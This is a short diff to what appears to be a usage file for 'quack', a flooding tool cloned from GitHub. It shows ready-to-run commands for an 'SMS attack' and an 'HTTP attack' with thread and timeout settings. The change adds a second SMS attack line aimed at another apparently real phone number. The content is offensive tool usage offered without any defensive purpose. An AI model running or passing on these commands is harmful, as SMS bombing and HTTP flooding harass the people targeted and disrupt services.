@@ -1,7 +1,8 @@
 git clone https://github.com/entynetproject/quack.git
 Example of the SMS attack
 quack --tool SMS --target +967713458500 --timeout 10 --threads 10
- 
+ quack --tool SMS --target +967717761630 --timeout 10 --threads 10
+
 
 Example of the HTTP attack
 quack --tool HTTP --target http://example.com/ --timeout 10 --threads 10
